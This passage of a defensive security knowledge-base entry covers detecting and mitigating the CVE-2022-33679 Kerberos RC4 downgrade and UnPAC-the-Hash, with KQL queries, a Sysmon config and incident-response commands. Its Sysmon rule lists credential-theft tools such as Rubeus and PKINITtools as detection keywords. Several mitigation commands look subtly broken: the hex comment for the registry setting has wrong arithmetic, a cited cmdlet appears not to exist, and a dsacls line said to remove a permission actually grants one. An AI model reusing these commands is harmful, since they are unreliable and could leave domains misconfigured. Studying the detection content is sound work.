- **Applies To Versions:** All (through Windows Event Log ingestion)

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4768
| where EncryptionType_s =~ "RC4-MD4" or EncryptionType_s =~ "RC4-HMAC-MD5"
| summarize count() by Account, Computer, bin(TimeGenerated, 5m)
| where count_ > 0
```

**What This Detects:**
- Explicit RC4-MD4 encryption in Kerberos TGT requests
- Direct indicator of CVE-2022-33679 exploitation attempt
- Should be extremely rare (RC4 is deprecated)

**Manual Configuration (Azure Portal):**

1. Microsoft Sentinel → Analytics → Create → Scheduled query rule
2. Name: "CVE-2022-33679 RC4-MD4 Downgrade Detected"
3. Paste KQL query above
4. Severity: Critical
5. Frequency: 1 minute
6. Lookback: 1 hour
7. Create

---

### Query 2: Detect UnPAC-The-Hash Activity (PKINIT + U2U)

**Rule Configuration:**
- **Required Table:** `SecurityEvent`
- **Required Fields:** `EventID`, `PreAuthType_s`, `AccountName`
- **Alert Severity:** **High**
- **Frequency:** Every 5 minutes
- **Applies To Versions:** Server 2016+ (Kerberos 5.2+)

**KQL Query:**

```kusto
let pkinit_logons = SecurityEvent
    | where EventID == 4768
    | where PreAuthType_s =~ "PKInit";
    
let u2u_requests = SecurityEvent
    | where EventID == 4769
    | where TransmittedServices contains "self";
    
pkinit_logons
| join kind=inner (u2u_requests) on AccountName, Computer
| summarize count() by AccountName, Computer, bin(TimeGenerated, 5m)
| where count_ >= 1
```

**What This Detects:**
- PKINIT pre-authentication (certificate-based) followed by U2U request
- Specific pattern of UnPAC-The-Hash exploitation
- Legitimate in smart card scenarios but suspicious if unexpected

**Manual Configuration:**

1. Microsoft Sentinel → Analytics → Create → Scheduled query rule
2. Name: "UnPAC-The-Hash Activity (PKINIT + U2U)"
3. Paste KQL above
4. Severity: High
5. Create

---

## 10. WINDOWS EVENT LOG MONITORING

### Event ID 4768 - Kerberos Authentication Ticket (TGT) Request

- **Log Source:** Security (on Domain Controller)
- **Trigger:** TGT request (AS-REQ/AS-REP)
- **Filter for Exploitation:** EncryptionType = RC4-MD4, account with pre-auth disabled
- **Applies To Versions:** All

**Manual Configuration (Group Policy):**

1. GPMC → Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy Configuration
2. Account Logon → Audit Kerberos Authentication Service
3. Enable: Success + Failure
4. `gpupdate /force`

---

### Event ID 4769 - Kerberos Service Ticket (TGS) Request

- **Log Source:** Security (on Domain Controller)
- **Trigger:** Service ticket request
- **Filter for Exploitation:** Rapid volume from same user, multiple unique services (Kerberoasting), TransmittedServices = "self" (U2U / UnPAC)
- **Applies To Versions:** All

---

### Event ID 4770 - Kerberos Ticket Renewal

- **Log Source:** Security
- **Trigger:** TGT renewal
- **Filter for Exploitation:** RC4-MD4 encryption in renewal (indicates compromised credentials)
- **Applies To Versions:** All

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Sysmon Configuration (XML):**

```xml
<Sysmon schemaversion="4.30">
  <EventFiltering>
    <!-- Monitor for Kerberos-related tools -->
    <RuleGroup name="Process Creation" groupRelation="or">
      <ProcessCreate onmatch="include">
        <CommandLine condition="contains any">Rubeus;PKINITtools;getnthash;gettgtpkinit;CVE-2022-33679;GetUserSPNs;asproast;kerberoast</CommandLine>
        <Image condition="contains">python;powershell</Image>
      </ProcessCreate>
    </RuleGroup>

    <!-- Monitor for certificate-related operations (PKINIT) -->
    <RuleGroup name="Registry" groupRelation="or">
      <RegistryEvent onmatch="include">
        <TargetObject condition="contains">Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedMRU</TargetObject>
        <TargetObject condition="contains">.pfx;.p12;.pem</TargetObject>
      </RegistryEvent>
    </RuleGroup>

    <!-- Monitor for DLL loading from Kerberos-related tools -->
    <RuleGroup name="Image Load" groupRelation="or">
      <ImageLoad onmatch="include">
        <ImageLoaded condition="contains any">Rubeus;impacket;kerberos</ImageLoaded>
      </ImageLoad>
    </RuleGroup>

    <!-- Monitor for network connections to port 88 (Kerberos) from unusual processes -->
    <RuleGroup name="Network Connection" groupRelation="or">
      <NetworkConnect onmatch="include">
        <DestinationPort>88</DestinationPort>
        <Image condition="excludes">lsass.exe;svchost.exe</Image>
      </NetworkConnect>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

**Installation:**

```powershell
sysmon64.exe -accepteula -i sysmon-config.xml
```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: "Suspicious Kerberos Authentication"

- **Severity:** High
- **Description:** Detects patterns consistent with CVE-2022-33679 or UnPAC-The-Hash exploitation
- **Applies To:** Azure subscriptions with Defender for Identity enabled

**Manual Configuration:**

1. Azure Portal → Microsoft Defender for Cloud
2. Environment settings → Enable "Defender for Identity"
3. Review alerts: Security alerts → Filter by "Kerberos"

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Detect Suspicious Kerberos Activity

**Applicable To:** Microsoft 365 + Azure AD Connect or Entra ID

```powershell
Connect-ExchangeOnline

# Search for suspicious certificate-based authentication
Search-UnifiedAuditLog -Operations "User_logged_in","ServicePrincipalKeyAdded" -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) -ResultSize 5000 | Export-Csv "kerberos_activity.csv"

# Monitor for unusual pre-authentication changes
Search-UnifiedAuditLog -Operations "Set-User" -StartDate (Get-Date).AddDays(-7) -FreeText "PreAuthenticationRequired" | Export-Csv "preauth_changes.csv"
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Disable RC4-MD4 Encryption in Kerberos**

**Applies To Versions:** All (Server 2008 R2 - 2022)

**Manual Steps (Group Policy):**

1. GPMC → Computer Configuration → Policies → Administrative Templates → System → Kerberos
2. Find: "Restrict cryptographic algorithms for Kerberos"
3. Enable, set to: Disable RC4, RC4-MD4
4. `gpupdate /force`

**Manual Steps (Registry):**

```powershell
# Disable RC4 and RC4-MD4 in Kerberos
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" /v SupportedEncryptionTypes /t REG_DWORD /d 0x58 /f

# 0x58 = AES256 (0x40) + AES128 (0x18) only
# Requires restart
shutdown /r /t 60
```

**Manual Steps (Server 2022+):**

```powershell
# Using Windows Admin Center or Server Manager
Set-KerberosEncryption -Type AESOnly
```

**OpSec & Evasion (Defender Perspective):**
- Verify RC4 is disabled: `Get-DomainGPO | Where { $_.gPCFileSysPath -like "*Kerberos*" }`

---

**Action 2: Enable Kerberos Pre-Authentication on All Accounts**

**Applies To Versions:** All

**Manual Steps (PowerShell):**

```powershell
# Find all accounts with pre-auth disabled
Get-ADUser -Filter { UserAccountControl -band 4194304 } | ForEach-Object {
    Set-ADUser -Identity $_.SamAccountName -UserAccountControl ($_.UserAccountControl -bxor 4194304)
    Write-Output "Re-enabled pre-auth for $($_.SamAccountName)"
}

# Verify (should return 0 results)
Get-ADUser -Filter { UserAccountControl -band 4194304 } | Measure-Object
```

**Manual Steps (Group Policy - For Service Accounts):**

1. GPMC → Computer Configuration → Policies → Windows Settings → Security Settings → Account Policies → Kerberos Policy
2. "Do not require pre-authentication" = Disabled
3. `gpupdate /force`

---

**Action 3: Apply KB5019959 (August 2023 Patch) or Later**

**Applies To Versions:** All

**Manual Steps:**

```powershell
# Check current patch level
Get-HotFix | Select-Object HotFixID, InstalledDate | Sort-Object InstalledDate -Descending

# Install KB5019959 or monthly cumulative update with this patch
# Via Windows Update or WSUS
wusa.exe KB5019959.msu /quiet /norestart

# Verify installation
Get-HotFix -Id "KB5019959"
```

---

### Priority 2: HIGH

**Action: Implement Certificate-Based Pre-Authentication**

**Manual Steps (Group Policy - Enforce PKINIT):**

1. GPMC → Computer Configuration → Policies → Windows Settings → Security Settings → Public Key Policies
2. Configure smart card requirements for sensitive accounts
3. Or enforce certificate-based authentication via Conditional Access (Entra ID)

---

**Action: Monitor and Alert on Certificate Enrollment**

**Manual Steps (Auditing):**

1. Enable AD CS auditing: `auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable`
2. Monitor Event ID 4876 (Certificate Manager enrollment)
3. Alert on unexpected certificate requests

---

### Access Control & Policy Hardening

**Action: Implement Kerberos Armoring (FAST)**

**Manual Steps (Group Policy):**

1. GPMC → Computer Configuration → Administrative Templates → System → Kerberos
2. "Provide claims types supported by the KDC" = Enable
3. Require FAST for all Kerberos requests

---

**Action: Restrict Service Account Enumeration**

**Manual Steps (AD Permissions):**

```powershell
# Remove "List contents" permission on Users OU for standard users
# Reduces ability to enumerate pre-auth disabled accounts
# Requires AD permission changes (DSACLS or Active Directory Users & Computers)
dsacls "CN=Users,DC=domain,DC=local" /G Everyone:LC:N
```

---

### Validation Command

```powershell
# Verify RC4 is disabled
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" /v SupportedEncryptionTypes

# Verify pre-auth is enforced
Get-ADUser -Filter * -Properties UserAccountControl | Where { $_.UserAccountControl -band 4194304 } | Measure-Object  # Should return 0

# Verify patch level
Get-HotFix -Id "KB5019959"
```

**Expected Output (If Secure):**
```
SupportedEncryptionTypes: 0x58 (AES256 + AES128 only)
Pre-auth disabled users: 0
KB5019959: Installed
```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- Kerberos ccache files: `*.ccache`, `output.ccache`
- Kerberos ticket files: `*.kirbi`
- PKINITtools artifacts: `getnthash.py`, `gettgtpkinit.py`
- CVE-2022-33679 PoC: `CVE-2022-33679.py`
- Certificates: `*.pfx`, `*.pem`, `*.p12`
- Hash files: `spn_hashes.txt`, `krb5tgs_hashes.txt`

**Registry:**
- `HKCU\Software\Microsoft\Kerberos\` (unusual entries)
- Recent certificate locations in user temp/cache directories

**Network:**
- Source: Any non-SYSTEM process sending Kerberos traffic to port 88
- Destination: Domain controllers, port 88/TCP-UDP
- Pattern: AS-REQ with RC4-MD4 requested → AS-REP received → rapid TGS-REQ burst

**Event Log:**
- Event ID 4768 with RC4-MD4 encryption (should not occur)
- Event ID 4769 from disabled/non-existent users
- Event ID 4770 with RC4-MD4
- Event ID 4772 (Pre-authentication failed) in bursts

---

### Forensic Artifacts

**Disk:**
- `C:\Windows\System32\winevt\Logs\Security.evtx` (Event IDs 4768, 4769, 4770)
- User temp directories: `C:\Users\*\AppData\Local\Temp\` (ccache files)
- Kerberos cache location: `C:\Users\*\AppData\Local\Kerberos\` (if configured)
- Powershell history: `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\`

**Memory:**
- Rubeus process memory (if executed)
- Python interpreter (if PKINITtools used)
- lsass.exe may have evidence of Kerberos operations

**Cloud (Entra ID / M365):**
- AuditData in UnifiedAuditLog (suspicious certificate use, authentication anomalies)
- SigninLogs (unusual authentication patterns)
- Audit.General events (user account modifications)

---

### Response Procedures

**1. Isolate**

**Command:**
```powershell
# Disable affected user account immediately
Disable-ADAccount -Identity "compromised_user"

# Force password reset
$newPassword = ConvertTo-SecureString -AsPlainText (New-Guid).Guid -Force
Set-ADAccountPassword -Identity "compromised_user" -NewPassword $newPassword -Reset -Verbose
```

**Manual:**
- Remove user from all security groups
- Disable compromised accounts in Azure AD (if hybrid)

---

**2. Collect Evidence**

**Command:**
```powershell
# Export Security event log
wevtutil epl Security "C:\Evidence\Security.evtx"

# Export Kerberos-specific events
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4768 or EventID=4769 or EventID=4770]]" | Export-Csv "C:\Evidence\Kerberos_Events.csv"

# Check for suspicious files
Get-ChildItem -Path "C:\", "$env:TEMP" -Recurse -Include "*.ccache", "*.kirbi", "*CVE-2022-33679*" -Force
```

---

**3. Remediate**

**Command:**
```powershell
# Reset KRBTGT twice (if compromise is domain-wide)
Set-ADAccountPassword -Identity krbtgt -Reset -Verbose
Start-Sleep -Seconds 900  # Wait 15 minutes for replication
Set-ADAccountPassword -Identity krbtgt -Reset -Verbose

# Disable RC4 globally (if not already done)
# Via Group Policy (see Priority 1 mitigations)

# Force password change for all admin accounts
Get-ADGroupMember "Domain Admins" | ForEach-Object {
    Set-ADUser -Identity $_.SamAccountName -ChangePasswordAtLogon $true
    Write-Output "Marked $($_.SamAccountName) for password change"
}
```

---

**4. Eradication**

**Command:**
```powershell
# Verify all pre-auth disabled accounts are re-enabled
Get-ADUser -Filter { UserAccountControl -band 4194304 }

# Confirm RC4 is disabled
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" /v SupportedEncryptionTypes

# Hunt for lateral movement (Kerberoasting results)
Get-ADComputer -Filter * | ForEach-Object {
    Get-EventLog -LogName Security -ComputerName $_.Name -FilterScript { $_.EventID -eq 4769 -and $_.TimeGenerated -gt (Get-Date).AddHours(-24) }
}
```

---

**5. Recovery**

- Monitor 24/7 for 30 days (verify no re-compromise)
- Check all Kerberos tickets in cache: `klist` / `klist purge`
- Review all service account permissions (Kerberoasting may have revealed passwords)
- Consider forest-wide remediation if domain admin accounts compromised

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [ENUM-001] LDAP User Enumeration | Attacker identifies users with pre-auth disabled via LDAP query |
| **2** | **Access Acquisition** | **[CA-KERB-014] CVE-2022-33679 OR UnPAC-The-Hash** | **Attacker exploits RC4 downgrade or certificate to extract credentials** |
| **3** | **Lateral Movement** | [CA-KERB-003] Pass-the-Hash / [CA-KERB-007] Silver Ticket | Attacker uses extracted NTLM hashes or forged tickets to access resources |
| **4** | **Privilege Escalation** | [CA-KERB-010] Kerberoasting | Attacker cracks service account hashes to gain elevated access |
| **5** | **Persistence** | [CA-KERB-013] Golden Ticket | Attacker forges TGT for long-term domain persistence |
| **6** | **Impact** | [AD-EXFIL-001] Sensitive Data Exfiltration / [AD-RANSOM-001] Ransomware | Attacker achieves objectives |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: Google Project Zero - CVE-2022-33679 Disclosure (2022)

- **Researcher:** James Forshaw (Google Project Zero)
- **Timeline:** October 2022 (public disclosure)
- **Technique Usage:** Original vulnerability research and PoC development
- **Impact:** Critical Kerberos vulnerability affecting all Windows domain environments worldwide
- **Reference:** [Google Project Zero Blog - RC4 is Still Considered Harmful](https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html)

---

### Example 2: Microsoft Security Updates (2023)

- **Target:** All Windows Server environments
- **Timeline:** August 2023 (KB5019959 released)
- **Technique Status:** Microsoft patched by disabling RC4-MD4 by default
- **Impact:** Widespread patching effort across enterprises to close CVE-2022-33679 exploitation vector
- **Reference:** [Microsoft Security Update KB5019959](https://support.microsoft.com/en-us/topic/kb5019959)

---

### Example 3: Security Researchers - Unauthenticated Kerberoasting (2024)

- **Researchers:** Horizon3.ai, Various Security Bloggers
- **Timeline:** 2023-2024 (post-disclosure extended research)
- **Technique Usage:** Chained CVE-2022-33679 + Kerberoasting to dump all service account hashes without credentials
- **Impact:** Demonstrated complete credential exposure in pre-patch environments
- **Reference:** [Horizon3.ai - From CVE-2022-33679 to Unauthenticated Kerberoasting](https://horizon3.ai/attack-research/attack-blogs/from-cve-2022-33679-to-unauthenticated-kerberoasting/)

---

### Example 4: Enterprises - Certificate-Based Attacks (Ongoing)

- **Threat Actors:** Various APT groups, Insider Threats
- **Timeline:** 2022-Present (UnPAC-The-Hash using compromised certificates)
- **Technique Status:** Active exploitation via certificate abuse, golden certificates, shadow credentials
- **Impact:** NTLM hash extraction from accounts even if pre-auth is enabled (if certificate-based auth is allowed)
- **Reference:** [ExtraHop - UnPAC-the-Hash Activity Detection](https://www.extrahop.com/resources/detections/unpac-the-hash-activity/), [Synacktiv - PKINIT Evasion](https://www.synacktiv.com/publications/understanding-and-evading-microsoft-defender-for-identity-pkinit-detection)

---

## 18. COMPLIANCE REMEDIATION CHECKLIST

- [ ] **CIS 5.2.1.1:** RC4 encryption disabled in Kerberos
- [ ] **CIS 5.2.3.2:** Pre-authentication required for all domain accounts
- [ ] **DISA STIG WN10-CC-000150:** RC4 not supported for Kerberos
- [ ] **DISA STIG WN10-CC-000155:** Strong encryption enforced
- [ ] **CISA SCuBA UC-1.4:** Legacy authentication protocols disabled
- [ ] **NIST IA-7:** Cryptographic mechanisms for Kerberos verified
- [ ] **NIST SC-13:** Weak algorithms (RC4, DES, MD4) disabled
- [ ] **GDPR Art. 32:** Cryptographic strength audit completed
- [ ] **DORA Art. 9:** Encryption standards documented and enforced
- [ ] **NIS2 Art. 21:** Cryptographic baselines established
- [ ] **ISO 27001 A.9.2.3:** Privilege access to pre-auth settings restricted
- [ ] **ISO 27001 A.10.1.2:** Change management log for Kerberos settings
- [ ] **ISO 27005:** Risk assessment updated post-CVE-2022-33679

---
